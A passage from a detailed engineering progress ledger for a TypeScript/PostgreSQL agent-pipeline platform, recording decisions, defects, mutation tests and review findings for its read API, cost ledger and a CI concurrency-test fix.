**Rule 83 — sentences the fix falsified, now true.** `DatabaseHandle.close`'s docblock and
`apps/server/src/runtime.ts`'s shutdown-order paragraph both implied a shutdown that ends every
socket; both now say what `end()` does not promise and why the listener exists.
`test/e2e/support/instance.ts`'s `stop` says the drop deliberately does not wait for the drain and
what carries the risk instead. `test/integration/support/postgres.ts`'s module docblock states what
`with (force)` costs its callers. `vitest.config.ts`'s coverage-exclusion comment for `client.ts`
said "no branch of their own" — still true, and it now says the one decision lives in the
non-excluded `pool-errors.ts` rather than hiding behind the exclusion.

**Decisions and assumptions.**
- **No bounded drain before the drop.** Waiting for `pg_stat_activity` to empty would shrink the
  window but not close it, and would add wall-clock to every one of the tier's database drops. The
  listener is a guarantee; a wait is a smaller race.
- **The harness swallows `57P01` only.** Residual, stated at the line: a forced drop that ever
  surfaced as a bare `ECONNRESET` would fail the run instead of being absorbed. That is the
  direction this should fail in, and the measured code is `57P01`.
- **`pool.on('error')` is attached at the factory, not at call sites**, so "a pool without a
  listener" is a thing the census refuses rather than a thing review has to notice.
- **What the local run cannot show** (rules 69/71/84): the tier of record for this defect is Linux
  CI. This machine has never reproduced the *race* — measurement 1 shows why — so a green
  `verify:e2e` here is evidence that nothing regressed, not evidence that the flake is gone. What is
  demonstrated locally is that the delivery path the flake used now ends in a listener, on both the
  harness's pools and the production one.

**One thing measured and deliberately not changed.** `PostgresBroadcast.close()` does not await an
in-flight `#connect()`: a connection coming up while `close()` runs is ended by `#connect` itself a
moment later, so `eventing.stop()` can also return before that socket is gone. It is harmless — the
`NotificationClient` carries its own `error` listener and `#onConnectionLost` returns early once
closed — and it is noted here so the next reader does not have to re-measure it.

### WP-15h — the read API and the run topic

**Scope, as the orchestrator set it.** The run endpoints (`GET /api/runs/:id`, `/messages`,
`/prompt`, `/context-pack`), `GET /api/tasks/:task_id`, the `run:<id>` SSE publisher, and the census.
The other eleven client paths stay unimplemented and are listed **in the census** with the row that
owns each.

**How a frame reaches a stream in another process — decided, built, and asserted against two real
`LISTEN` sessions.** The sink publishes a **position** (`{run_id, seq}`) on one dotted broadcast topic,
`run.transcript.appended`; `apps/server/src/sse/transcript-bridge.ts`, started by every process that
serves the API, reads `run_messages` back and publishes into **its own** hub. So a `ROLE=api` process
serves a transcript a `ROLE=worker` process produced, and `ROLE=all` is the same path with both ends in
one process (PostgreSQL delivers a notification to every listening session, including the publisher's).
Four decisions at the line: **one** dotted topic rather than one per run, because `subscribe` fixes its
topic set and a topic per run would mean re-subscribing per browser tab; the read is a **catch-up** read
after a watermark, so a dropped notification (the port documents them as droppable) costs latency rather
than a hole; **only a watched run is read back** (TD-014: content is forwarded "only while a client is
subscribed to the run"), so an unwatched run costs one map lookup and no query; and **one pump per run**,
because the listener is synchronous and two interleaved catch-up reads would publish out of `seq` order,
which the hub's *positional* replay turns into a skipped entry.

**Two defects found by reading, both of the same shape: a column whose stored value nobody had ever
read back.**

1. **`RunRecord.stage` had no source.** `RunRepository.insert` takes a `stage`, the SQL adapter
   **dropped it**, and `load` returned the literal `stage: null` — for every run this repository has
   ever stored. The schema's own docblock says the projection "joins rather than reads it", and there
   was nothing to join to, because `runs.task_stage_id` was never written either. The insert now
   resolves it from `(task_id, stage, attempt)` — the key `recordStageEntered` upserts on — and the
   contract suite asserts the round trip **and** the null case (a run for an attempt nobody entered).
   The in-memory store mirrored the bug in the kind direction: it cloned the caller's `stage` and
   answered a question the database could not (rule 1), and now resolves it the same way.
2. **`tasks.workpad_ref` stored a shape the published DTO rejects.** `upsertWorkpad` returns a
   `CommentRef` = `workpadRefSchema.extend({ marker_id })`; TypeScript passes it through
   `saveWorkpad(… : WorkpadRef)` structurally, and the adapter stringified it whole. `jsonb` accepts
   anything, so it surfaced only when the first reader existed: `GET /api/tasks/:id` answered **500**
   `Unrecognized key: "marker_id"` for every task with a workpad, found by the e2e on its first run.
   Fixed at the writer (the marker is `workpadMarker(taskId)`, derivable, which is why the published
   shape never carried it) **and** guarded — both stores now `workpadRefSchema.parse` before writing
   (rule 20, fail closed on a mutation), with a contract-suite case that plants `marker_id`.

**Where a column is never written, the route refuses by name rather than returning an empty document.**
`runs.system_prompt`/`user_prompt`: nothing writes them — `StoredRun` has no field for them at all — so
`/prompt` is **409 `prompt_not_recorded`**. `/context-pack` is **409 `context_pack_not_recorded`** and
has **no success branch at all** — see the round-1 finding below. A `run_messages` row with a non-null
`blob_id` is refused (`row_not_projectable`) rather than served from `payload`, whose contents are
undefined by the schema in that case. All three are 4xx deliberately: `toApiError` strips a 5xx's
message, and a table name, a uuid and a column name carry no untrusted content, so naming them costs
nothing a 5xx protects. Both refusals are declared in the route schema (`409: apiErrorSchema`), so the
OpenAPI document describes the answer these endpoints actually give.

**Round 1's five findings, and the one that is a lesson rather than a tidy-up.** Four were: a dead
`findRunMessage` whose docblock called itself "the SSE bridge's read-back" while the bridge used
`listRunMessages` (deleted — rule 31); an unenforced pairing claim on `scopeToProject` (now
`routes/scope.test.ts`, a disk-read census over the route modules asserting both directions —
*resolves a project and decides nothing* is the dangerous one, and `client-census.test.ts` **cannot**
see it because its anonymous probe gets 401 from either half); `TranscriptBridge.stop()` not awaiting
the pumps in flight while `runtime.ts` closes the broadcast and the pool on the next lines (now
`stopped` first, subscription second, `allSettled` third — bounded by the work, not a timer); and
decision 3 ("one pump per run") having no case at all, every test being too fast to reach it.

**The fifth is the one to carry: the reader fabricated the field its own refusal said it could not
fill.** `findRunContextPack` summed the rows into `budget_tokens`, invented `'paths'` for a null
`reason` and `0` for a null `score` — and **the integration test pinned all three**. `run_context_pack`
has no budget column anywhere, and `apps/web/src/features/run-detail.tsx` renders `budget_tokens` as a
fact, so the first real producer would have shipped *"budget equals total"* for every run with nothing
in any tier able to contradict it. It is rule 3's shape at the level of a *value* rather than a guard:
the test asserted what the code did, and both were wrong in the same direction, so nothing disagreed.
The endpoint now has no success branch — it refuses with the **row count** in the message, so `0` ("no
producer yet") and `2` ("a producer exists, the schema gap is still open") are distinguishable — and
the integration case asserts the refusal **with rows present**, which is the assertion the first
version could not have made. Giving this endpoint an answer is a schema change plus a writer, not a
reader.

**The census (`apps/server/src/routes/client-census.test.ts`), calibrated then mutated.** The client's
half is read from every `.ts`/`.tsx` file git knows about under `apps/web/src` — **tracked and
untracked** (rule 85) — excluding `*.test.*` by suffix and comments by stripping them, so
`endpoints.ts`'s own claim to be the only caller is enforced rather than decorative (rule 44). The
server's half is a real unauthenticated request through the real router, classified by the not-found
handler's own body — not `openapi.json`, which hides `/api/auth/*` — which makes the same probe the
**per-route auth assertion** (rule 68). Six measurements: unmutated **6 passed**; a fabricated path in
an **untracked** file → fails naming it; the same file `git add -N`'d → fails naming it; one route's
`preHandler` removed → fails with `/api/runs/{} -> 500 internal_error`; a gap entry for a path that *is*
served → fails; a gap entry the client never names → fails. The `scopeToProject` 401-before-lookup
guard was mutated too (all five routes → 500).

**Assumptions, written because the docs do not settle them.** (a) `/prompt` is gated at
`transcript.read` (member) and `/context-pack` at `run.read` (viewer): the prompt is the ticket's own
words and the role prompt, which is the content technical/08 gates at member; the pack is a list of
paths, scores and token counts. (b) `task_stages.state` is `text` and "free-form until WP-15 fixes the
interpreter's vocabulary" — the interpreter writes `entered`/`exited`, the DTO publishes neither, so
the projection maps them (`entered` + no `exited_at` → `running`, otherwise `completed`) and anything
unrecognised becomes `pending`, the reading that claims least. (c) `model_usage` comes from
`run_model_usage`, which nothing writes, so it is `[]` — an empty **list** is not a missing value, and
the totals are on `runs` where the reader finds them.

**The e2e is `agent: 'real-over-fake-cli'`, and the choice is the criterion.** `FakeClaudeRunner` is
composed with `sink: { append: async () => {} }` (`test/e2e/support/pipeline.ts:493`), so a run driven
through it writes **no `run_messages` row**: an assertion about a transcript in that mode is an
assertion about an empty table (rules 4 and 82 — audit the instrument first). The harness gained one
knob, `onAgentSpec`, awaited inside `provision`: it holds the first run at its workspace so the test can
learn `spec.runId`, open the SSE stream and only then let the CLI speak — a promise the test resolves,
not a sleep (rule 2). The both-direction secret assertion is
`test/e2e/server/run-api.e2e.test.ts` › "serves the run, its transcript, its task — and the live
frames — without the run’s secret", and it is asserted **twice on two paths**: on the HTTP page
(placeholder present, plaintext absent) and on the SSE frame, which never touches the projection.

### WP-15h part 2 — the remaining reads

**What was built.** The seven reads the census attributed to a later iteration —
`GET /api/org/agents`, `/api/org/inbox`, `/api/integrations`, `/api/integrations/:id/setup-guide`,
`/api/projects`, `/api/projects/:id/readiness`, `/api/projects/:id/tasks` — plus
`GET /api/projects/:id/kb/health`, the one the plan row names and the census **cannot** see. Four
projection modules now (`queries/{pipeline,project,integration,knowledge}-queries.ts`), two new
route files' worth of routes, four DTOs in `packages/contracts`, and
`packages/integrations/src/catalogue.ts`. The census's `ADMITTED_GAPS` is now **commands only**.

**The one thing in the plan row that is NOT here:** the row's second half — serving the SPA itself
(backlog **33**, `@fastify/static` and the allow-list-shaped fallback). The brief scoped part 2 to
the reads; the row is not finished by this change.

**The defect this work package found, and it is the interesting one.** The task page's keyset
carried `created_at` as the `Date` node-postgres parsed it. `timestamptz` is **microseconds** and a
JavaScript `Date` is **milliseconds**, so the cursor was strictly *earlier* than the row it was built
from: `created_at = $1` never matched and `created_at < $1` excluded it, and the row was dropped.
Measured on the integration tier — three tasks, `limit: 1`, **two** came back — and it is invisible
from the outside, because a short page and the last page are the same response. The cursor now
carries the database's own rendering (`to_char(… 'YYYY-MM-DD"T"HH24:MI:SS.US"Z"')`, six fractional
digits, which `z.iso.datetime()` accepts — checked) and the comparison casts it back to
`timestamptz`; nothing between the two is a `Date`. The unit test asserts the microseconds survive
the round trip and the integration case asserts the page count, with a regex pinning the six digits
so the fix is not being tested against millisecond data (rule 4).

**Decisions and assumptions, each with its reason.**

1. **"Pending for the caller" is read as "pending".** technical/08 describes the inbox that way and
   **nothing records an assignee** — `questions` has `answered_by_user_id` (written when somebody
   answers) and no "asked of" column. Filtering by a column that does not exist would mean inventing
   a routing rule in a reader, so the endpoint answers the organisation's open work and `task.read`
   (viewer) is what scopes it.
2. **No organisation filter on any organisation-wide read.** `listUsers` and `listAuditEntries` have
   never had one and this is a single-organisation self-hosted deployment (product/01). Adding one
   here would make these three endpoints the only ones with an opinion about `org_id`.
3. **`GET /api/projects` is decided on the organisation role**, not per project. `project.read` is
   `viewer` at organisation level anyway, so a per-item filter would answer a different question
   from `can()` in exactly one place.
4. **`/readiness` refuses by name — 409 `readiness_not_evaluated` — with the row count.** Nothing
   writes `readiness_evaluations` (grep: the only hits are the migration and the parity test).
   `projects.readiness_level` is `not null default 0`, so a projection *could* answer
   `{level: 0, evaluated_at: <now>, criteria: []}` — and two of those three would be invented:
   `evaluated_at` would be the time of the read, and an empty criteria list renders as "nothing
   passed", a claim about the project rather than about the schema. Same shape as part 1's
   `/context-pack`, including the row count so "no producer yet" and "a producer exists" differ.
5. **`GET /api/integrations` strips the provider's declared credential fields, and that is a
   security guard rather than tidiness.** `bindings/loader.ts` merges `{...config, ...secrets}` and
   every provider's schema accepts its credential from either side, so a binding whose token was
   pasted into `integrations.config` works — and would be served to anyone holding
   `integration.read`. For a provider this build does **not** ship the projection cannot tell
   configuration from credential, so it publishes `{}` and logs which row (fail closed; the
   alternative is a guess about a field list nobody here has). Both directions are asserted at the
   unit, integration and e2e tiers: the secret is gone *and* the configuration beside it survived.
6. **`integrations.health` is `unknown`/`checked_at: null` for the unwritten column.** Nothing writes
   it — `POST /api/integrations/:id/test` is the endpoint that would — and `unknown` is the published
   enum's own spelling for "nobody has checked", so this is reading the column rather than inventing
   a value. A stored block that does **not** match the published shape is refused by name, because a
   broken writer must not be indistinguishable from an unchecked integration.
7. **`webhook_url` is non-null only for a provider with an inbound half.** Sentry's own shipped guide
   says *"Do not point a Sentry webhook at the platform; nothing would consume it"*, and
   `IntegrationIngress` refuses such a delivery with `unsupported_provider` — so publishing a URL
   beside that guide would contradict the page on the same screen. It is the one **declared** field
   in the catalogue and `catalogue.test.ts` checks it against the object each provider's own `create`
   returns (`'inbound' in port`, the question `inbound-loader.ts` asks), in both directions, over
   every entry. The check is live: it failed loudly the first time, because GitLab refuses to be
   constructed without a token.
8. **The provider catalogue is separate from the pipeline registry, deliberately.**
   `createPipelineProviderRegistry` registers **two** providers and its docblock argues against
   adding the other three, because entries nothing constructs are a set the tests are not
   parameterised over. That argument is about `create`. A read surface calls `create` never and must
   still name every provider an operator can configure, or the integrations screen refuses to
   describe rows the platform itself reads on every webhook. Two questions, two lists — and nothing
   in the catalogue is hand-copied: four entries are derived from the provider's exported
   registration and Jira's metadata half is now `JIRA_CLOUD_PROVIDER_METADATA`, which its factory
   spreads. `catalogue.test.ts` reads the provider directories off disk (rule 7), so a sixth provider
   fails on the commit that adds it.
9. **Q45's three envelopes moved into `packages/contracts`**, which is what Q45 said to do "when the
   work package that implements the route lands". `projectsResponseSchema`, `tasksResponseSchema` and
   `integrationsResponseSchema` are byte-for-byte the shapes `endpoints.ts` composed, and that file
   now imports them. It is the only change to `apps/web` and it changes no screen.
10. **`kb/health` gets no client method.** The SPA has no screen for it, and a client method with no
    caller would falsify `endpoints.ts`'s own claim to be the list of endpoints the app talks to —
    and put a path into the census that the server serves and nobody uses. The endpoint plus its e2e
    is the deliverable; the panel is backlog 37's remaining half.
11. **Two partitions are asserted against the enums they partition** (rule 68):
    `TERMINAL_RUN_STATUSES` (agents = the complement) and `CLOSED_TASK_STATES` (`open_tasks` = the
    complement), read off `runStatusSchema`/`taskStateSchema` in `pipeline-queries.test.ts`. A status
    added to the enum and to neither list would otherwise silently pick the **visible** side: a
    finished run on the agents screen for ever, a closed task counted as open on every dashboard.
    Two judgement calls are named there: `stalled` is an ending, and `merged`/`retro` are not.
12. **`spent_usd_30d` is calendar arithmetic on the rollup key**, never an instant minus
    30 × 86 400 000 ms. `cost_rollup_daily.day` is written in the organisation's timezone (WP-19,
    Q12), so the cutoff is `rollupDay(now, zone)` minus 29 days computed on the `YYYY-MM-DD` string.

**PROGRESS backlog 35 is live on one of these reads, and it is said at the line rather than fixed.**
`GET /api/org/inbox` serves `questions.text`, which the stage executor copies out of the run's
`structuredOutput` — the document that reaches `artifacts.data` **unredacted** while the same
message's transcript copy went through TD-012 step 1. Backlog 35 names `questions.text` explicitly.
A reader that redacted would give the row and the response two different texts, so the fix stays at
the write; the docblock on `listInbox` and the route's own description both say so.

**The e2e composition, and what the fake emits (rule 82).** `agent: 'real-over-fake-cli'` for both
cases, because two assertions exist only there: `onAgentSpec` is awaited inside the workspace
provisioner, which is composed only in that mode, and it is the only way to read `/api/org/agents`
while a run is **running** rather than after every run has ended; and the scripted `result` reports
`total_cost_usd: 0.4` per run across two models, which is what gives `spent_usd_30d` a real figure to
sum. Checked before asserting: **no shipped scenario asks a question or requests an approval** —
`REFINED_SPEC.questions` is `[]` and its `decision` is `'proceed'` — so an inbox assertion on the
happy path would have been an assertion about an empty table. The second case therefore overrides the
refinement scenario to `decision: 'ask'` with one blocking question, which is the shipped mechanism
(`stageVerdict` maps `'ask'` onto the `questions` verdict) and parks the task at `waiting_answers`
after one stage. `kb_health_reports` is written by the **nightly hygiene cron and nothing else** (the
librarian stage's own `health` list is stored nowhere — backlog 37's other half), so the e2e enqueues
`JOB_QUEUES.knowledgeHygiene` on the instance's own job runtime and waits for the row; the 404 before
it and the 200 after it are both asserted. `open_tasks` is asserted at 1 before the merge and 0 after
it, and `spent_usd_30d` is asserted to have **increased** between the two reads rather than to equal a
constant, which a reader returning the same number twice could not satisfy.

**`integrations` is the one table with no writer anywhere in this build**, so "rows the pipeline
wrote" cannot apply to it: a row arrives by provisioning. The e2e says that out loud and asserts the
projection over the two rows the harness provisions the way an operator would — both of which name a
provider this build does not ship, so the e2e exercises the fail-closed branch and the integration
tier adds a real `gitlab` row for the filtered one.

**Sentences the fix falsified, and what was done with them (rule 83).** `technical/08`'s "Four of the
Knowledge row's eight endpoints are served" is now five, and the paragraph gained the rest of the
read surface with the `readiness` refusal named; `CLAUDE.md`'s read-API bullet said the projections
are one file and the gap list still held seven reads; `apps/web/src/api/endpoints.ts`'s docblock said
three envelopes "move into `packages/contracts` when the work package that implements the route
lands"; `routes/org.ts`'s docblock listed "the agent and inbox lists" among what belongs to later work
packages; `routes/kb.ts` said "four paths"; `docs/OPEN-QUESTIONS.md` **Q66**'s refiner note said the
health report "has **no reader**" and **Q45** said the envelopes were still to move. Three more are
**orchestrator-owned and reported rather than edited**: the WP-15h plan row (`13-implementation-plan.md:44`,
which still says part 2 is open and counts twenty-four unserved paths), PROGRESS backlog **29**'s
heading ("eleven paths remain"), and backlog **37**'s title ("read by nobody").

**Assumption a reviewer should check first:** `GET /api/org/agents` and `GET /api/org/inbox` refuse
the **whole list** when one row cannot be projected — a run with no `task_stage_id`, a question with
no `stage` — rather than dropping it. That is `findTaskDetail`'s existing stance ("a composite DTO
that silently dropped the row it could not describe would report a task with fewer runs than it
has"), and it is a stronger claim for a cross-project list: one malformed row blanks the dashboard.
It is fail-closed and it is diagnosable (409 naming the row), and it is the call most worth
disagreeing with.

### WP-19 — the cost ledger, and the three tables that had never held a row

**What was built.** A `cost.ledger` handler on `run.finished` / `run.failed` at TD-005 priority 10
(technical/02's own number), writing `cost_entries`, `run_model_usage`, `cost_rollup_daily` and
`budget_windows` in the handler's own transaction; a `cost.estimate` handler on `artifact.created`
that writes `tasks.size` and `tasks.estimate_usd` when a `RefinedSpec` lands; a budget guard the
stage executor asks at admission; `events/replay.ts`, the backfill; the price-table maintenance cron;
`GET /api/projects/:id/budgets`; migration **0017**. Four of those tables existed since 0004/0007 and
**had never had a writer**.

**Decisions and assumptions, each with its reason.**

1. **The ledger totals to the invoice.** The provider reports a run total *and* a per-model
   breakdown, rounded independently. `ledgerEntriesForRun` uses the per-model numbers and attributes
   the residual to the **primary** entry (the run's own model), so `sum(cost_entries.usd)` is the
   number an invoice can be reconciled against (BD-011: "provider-reported cost is truth"), and
   `residualUsd` reports how much moved rather than smoothing it away. A property test asserts the
   sum for any breakdown.
2. **`runs`, `wall_ms` and `turns` land on one entry per run**, the token and USD columns on every
   entry. That is what makes `sum(entries.usd) = sum(rollup.usd)` *and* keeps a two-model run from
   counting as two runs.
3. **A missing cost is priced, not zeroed** (standing rule 16, and WP-12's obligation on this row).
   `cost.is_estimate` (BD-004 `local` mode) and a `cost_unreported` run — tokens, no usable
   `total_cost_usd` — both go down the price-table path and are labelled `is_estimate`. A model with
   **no price row** produces *no ledger row* and is named in the log; its tokens are still recorded in
   `run_model_usage` with `usd_estimated: null`, because usage is a measurement and pricing is an
   interpretation of it.
4. **The model id is the only producer string the ledger stores, and it is bounded at 128 characters
   and refused past it** — not truncated, because truncation is many-to-one and would collapse two
   models onto one ledger key and one rollup row.
5. **Org and project budgets are enforced by a *read at admission*, not by a handler on
   `budget.exhausted`.** A handler would have to enumerate every task that might start a run next,
   which is a different set at every moment. `cost/guard.ts` carries the argument; the three budget
   events stay declared `unconsumed` with their real consumers named (Slack WP-10, UI WP-20).
6. **The task scope stays where WP-15 put it** — `taskBudgetExhausted` against the project's
   configuration. A task-scoped `budgets` row is projected but not enforced: one question with two
   answers is worse than one answer in the wrong place. Stated in `guard.ts` and in technical/03.
7. **Budget windows are implicit.** A window is identified by its start instant, so a charge after
   the boundary folds into a fresh row with fresh `notified_pct` and no job has to have run. TD-004's
   `budget.window.reset` queue is therefore **not** started in this build and nothing emits
   `budget.reset` (recorded in `cost/window.ts` and in the consumption table).
8. **One calendar.** The rollup's `day` and the budget window both use the organisation's timezone
   (BD-010, Q12), read once per event. A zone `assertTimeZone` refuses is **failed open** to UTC with
   a named warning, because a handler that threw would park the run stream and stop charging every
   project for one organisation's misconfiguration (rule 20's shape).
9. **`exhaustedNotified` is derived, not stored**: `recordSpend` emits `budget.exhausted` the first
   time `spent >= limit`, and that event commits with the `spent_usd` it was computed from, so a
   stored spend at or over the limit *is* the state in which it was emitted. The one case the
   derivation differs from a flag is a human raising the cap, which should announce again
   (product/09).
10. **The estimate model is Q65**, filed with its recommendation and implemented: per-size weights
    `S:1 M:2 L:4 XL:8`, project history then organisation history, and `null` rather than a default.
    Written once per task, so `estimateAccuracy` compares an expectation against an outcome.
11. **The price job fetches nothing.** There is no verified machine-readable price feed in this build
    and no credential for one; a job that scraped a page and wrote `price_list` would write money
    into the ledger's inputs from an unvalidated source, and a wrong price is a plausible number in
    every reconciliation afterwards. It closes superseded price windows (which technical/03 requires
    and an operator forgets) and **names the models the ledger could not cost**, which nothing else
    surfaces.

**The backfill, and how it relates to `handler_executions`.** It is a **distinct read-and-apply**, not
a re-dispatch: `EventBus.dispatch` refuses an event whose `event_dispatch` row a completed dispatch
deleted (backlog 20), so the queue can never serve a handler registered afterwards. `replayEvents`
reads `events` — append-only, TD-005 `REVOKE DELETE` — and runs the given handlers, each claiming
`(position, handler)` in `handler_executions` **exactly as the dispatcher does**. It does not bypass
that table; it *uses* it, and that works precisely because a new handler has no row at any position
while the `$dispatch` marker is a different handler name that `claim` never consults. A second pass
skips everything; an event the dispatcher already gave the ledger is skipped too. It writes no
`$dispatch` marker and completes no queue row — a marker written twice would claim a completeness the
pass does not have. A handler that throws **stops the pass** and `lastPosition` is the resume point:
a backfill that skipped what it could not apply would report success over a ledger with holes in it.

**What the fake runner emits, checked before asserting on it (standing rule 82).** The e2e harness's
`FakeClaudeRunner` scenario reports `usage` (1200/400), `cost.usd` 0.40 and **`modelUsage: []`** — so
that composition can reconcile entries against rollups and is *structurally incapable* of showing a
per-model row. The per-model criterion therefore uses `agent: 'real-over-fake-cli'`, where the
production runner reads a real `result` line through the production `normaliseModelUsage`; the
scripted CLI now reports **two** models (the run's own plus a sub-agent at 0.05 USD, summing to the
same `total_cost_usd`), because a single-model fixture would leave the split branch untested in every
tier that runs a real runner (rule 68).

**The consumption flip, held by a named test.** `run.finished`, `run.failed` and `artifact.created`
are `handled`; `consumption.test.ts` now has *"has no type left unconsumed that the cost ledger itself
handles (WP-19)"*, which reads the set **off the handlers** rather than from a list written in the
test — the mechanical half of backlog 1's ask, and four lines for the next consumer to copy. The
sibling case that asserted "exactly what the pipeline registers" now composes both registrations,
because this build has two.

**Sentences the fix falsified, and what was done with them** (rule 83): `docs/TODO.md`'s backfill item
is closed with the residual named (queue-depth alerting still has no owner); technical/02's *"differs
from this column on 28 rows"* is now **25**; technical/03 gained the 0017 amendment and a "who writes
what" note; `consumption.ts`'s docblock and its `unconsumed` comments were rewritten (`config.changed`
and the two `integration.action.*` rows no longer name WP-19 — the audit and health projections
technical/03 attributes to it are **not** on its plan row and have no work package). **One the
implementer could not make:** `TD-005-event-store-and-dispatch.md:50` also said *"diverges from the column
on **28 rows**"* and *"registers handlers for **21**"* — the numbers are now **25** and **24**, and an
implementer may not edit a decision record. **Applied by the orchestrator in the same change** (both
lines now carry the new number with the old one in parentheses); the round-2 reviewer verified the
counts against `consumption.ts`. Round 2 also found that this paragraph and the discovered-work bullet
below still described the edit as open after it had been made — the ledger contradicting its own tree,
rule 83 on the orchestrator's writing — and both are corrected here.

**Assumption a reviewer should check first:** `cost_entries.created_at` is the database's `now()`,
not the run's end. The rollup's `day` *is* the run's end (the event's `occurred_at`), so a run that
finishes at 23:59:59 and is charged at 00:00:01 lands in yesterday's rollup and today's partition.
That is deliberate — the rollup answers "what did the 11th cost" and the partition answers "when was
this row written" — but it is the kind of split that reads as a bug if nobody says it out loud.

### ci-fix — the event-log concurrency test's escaped rejection

**Hypothesis one was right about the class and wrong about the detail, and the detail is the fix.**
The resume note guessed *"the loser's promise rejects after the assertion has already consumed a
different rejection"*. There is no second rejection. The whole mechanism is one window:

```ts
const blocked = second.query(append(stream, 1)); // promise created — nothing attached
await first.query('commit');                     // ← the loser's 23505 lands in here
await expect(blocked).rejects.toMatchObject(…);  // handler attached, one await too late
```

Releasing the `event_streams` row lock is *what makes the rejection arrive inside that await*: the
commit is the event that unblocks the loser, so the two answers come back on two sockets within
microseconds of each other, and whichever the event loop reads first decides whether the job is
green. Node reports the loser as an `unhandledRejection`; vitest turns it into an unhandled error;
the job is **red with every test passing** — CI `34692908462`, `22 passed (22)`, `231 passed (231)`,
`FAIL: verify:integration`, on a docs-only commit.

**Reproduced before it was fixed** (rule 27), on a throwaway copy of the file: the old shape plus a
wait that lets the loser settle *before anything looks at it* gives, byte for byte, CI's output —
`error: stream task/…017 is at sequence 2, cannot append 1`, the same `pg/lib/client.js:694` frame,
the same `where: 'PL/pgSQL function events_enforce_stream_seq() line 12 at RAISE'`, `1 passed`,
`1 error`, exit 1.

**The forcing mechanism, and why it is not a sleep** (rule 76). To make the interleaving
deterministic the test has to know the loser has settled *without attaching a handler* — attaching
one is the very thing under test. `util.inspect` reads V8's promise state instead of subscribing:
measured on `node v25.1.0`, polling a rejected promise this way still fires `unhandledRejection`,
and a later `.catch` produces `PromiseRejectionHandledWarning`, so nothing was subscribed. Renders
at `depth: 0` are `Promise { <pending> }`, `Promise { <rejected> [Error] }` and a bare
`Promise { [Object] }` when fulfilled — "not pending" is the only usable test for settled. **None of
this is documented** (nodejs.org/api/util.html describes neither the rendering nor the
non-subscription), and it was measured on **one** runtime: this machine is v25.1.0 and `.nvmrc` pins
CI to 24, which could not be measured here (`/opt/homebrew/opt/node@24/bin/node` reports v25.1.0).
So `settleUnobserved` **asserts its first read is `<pending>`** — its caller reaches it one statement
after issuing the query, so the promise cannot have settled yet — and a Node that renders pending
some other way fails there by name instead of silently degrading the wait to no wait at all.

**The fix.** Both queries are handed to `outcomeOf` on the line that starts them, which maps them
onto `{kind:'fulfilled'}` / `{kind:'rejected', code, where}`; the test then *reads* outcomes instead
of racing promises. `Promise.allSettled` closes the same hole; the helper exists so the assertion can
say **which** side was rejected and which committed (rule 10). Both interleavings run every time
(rule 68) on streams `…017` and `…018`: the order CI's green runs took (commit observed first) and
the order it died on (rejection settles while nothing is looking). The product property is
**strengthened**, not weakened: `where` is now asserted to contain `events_enforce_stream_seq`, so
the test says the trigger refused the append rather than "something with SQLSTATE 23505" did, and
each case still ends on `assertOnlyTheWinnerLanded` — one row, `last_seq = 1`, stream still
appendable at 2.

**Mutation, on a copy** (rule 77). Calibrated unmutated: 9/9 green. Mutant — the creation-time
handler removed, everything else kept: `9 passed`, **`1 error`**, exit 1, the unhandled rejection
naming stream `…018`, i.e. the forced case and no other. Second mutant — the old shape *and* the
forcing removed, which is exactly the code that was on `main`: **3/3 green locally, zero unhandled
rejections**. That pair is the point of rule 76 here: the defect is fully deterministic given the
order, and the only random thing about it was whether this machine ever produced the order. Local
green never had a chance of catching it (rule 71); Linux CI is the tier of record.

**Rule 49 sweep.** Every `.rejects.` assertion in the integration and e2e tiers — **37 sites across
14 files** — takes its promise *inline* inside `expect(…)`, so the handler attaches in the same
synchronous turn; the one exception was `event-log.integration.test.ts:134`, the file that failed.
The concurrency-flavoured neighbours were read rather than grepped past:
`events/dispatcher.integration.test.ts` uses `Promise.all` (attaches at creation) and
`integrations/audit-log.integration.test.ts`'s "racing" case is deliberately staged rather than
concurrent. **Two near-siblings were found and deliberately left alone**:
`test/e2e/server/sse.e2e.test.ts:254,291` hold `instance.runtime.stop()` across other awaits. They
cannot produce this class on a passing run — the promise is expected to *resolve*, and the awaits
in between are what the test is asserting — but if `stop()` ever rejects there, the failure would
surface as an unhandled error instead of a clean one. Filed under discovered work; changing them
would touch the e2e tier for no defect.

**Assumption recorded**: "either losing order" is read as *the order in which the loser's rejection
settles relative to the winner's commit being observed*, not as *which connection loses* — the
winner is whoever takes the row lock first, so swapping the clients tests nothing new.

#### WP-19 — review round 1 (REQUEST_CHANGES): the one untested module was the one the census had just certified

**The major, and the measurement that came out of fixing it.** `GET /api/projects/:id/budgets` was
the only module in the diff nothing imported in any tier — while `ADMITTED_GAPS` no longer listed it,
so `client-census.test.ts` now *certified* a route whose body nothing asserted (rules 35/44/10). Its
failure mode is the worst kind: `spent_usd` comes from a `Map` keyed
`` `${budgetId}@${windowStart}` `` and a key that does not match reports **0**, which renders as a
budget nobody has spent against.

The fix is in `test/e2e/cost/ledger.e2e.test.ts`, and the **first version of it was not enough** —
worth recording, because it is standing rule 42 failing in a way that reads as covered. Round one of
the test seeded a stale 2020 window row on the charged budget and asserted the served number equalled
the ledger's. Two mutations on a copy of `cost-queries.ts`:

| mutation | first version | after |
|---|---|---|
| key never matches (`String(date)` instead of `toISOString()`) | **died** — `expected +0 to be close to 2` | died |
| key drops the window entirely (join on the budget alone) | **survived** | **died** — `expected 999 to be +0` |

The second survived because `new Map(rows.map(…))` keeps the **last** entry for a duplicate key, the
query has no `ORDER BY`, and the last row happened to be the right one. So the test was asserting
"some row of this budget" and passing for the wrong reason. What kills it is the *other side*: a
second budget added **after** the spend, with an old window row of its own — its current window has
no row at all, so the only correct answer is `0` and a window-blind reader answers `999`. It is a
`day` budget because `budgets_scope_scope_id_window_key` admits one row per
`(scope, scope_id, window)`. The 404 branch of `findProjectTimezone` is asserted in the same case.

**Three minors, each a claim rather than a behaviour.**

1. *Decision 8's fail-open was asserted only by its effect.* The warning is now asserted **by name**
   with its fields, and the negative case is scoped to the zone (a bare "no warnings" assertion would
   have been asserting the wrong silence — the harness seeds no price row, so the unpriced-model
   warning fires legitimately). The residual is stated at `usableTimezone` and filed: **no row records
   that a substitution happened**, so a reconciliation that finds an unexpected day has the log and
   nothing else. A column would fix it and is not worth a migration for a state an operator creates by
   typing an offset into a setting `assertTimeZone` rejects everywhere else.
2. *`cost/estimate.ts` claimed "a task whose size the platform already knows is left alone entirely".*
   False: the guard is `estimateUsd !== null`, so a task with a **size and no estimate** — the
   project's first task, which had no history — is re-read and re-written on a second `RefinedSpec`.
   The behaviour is right (that round is the first chance to give it a number, and the newer spec's
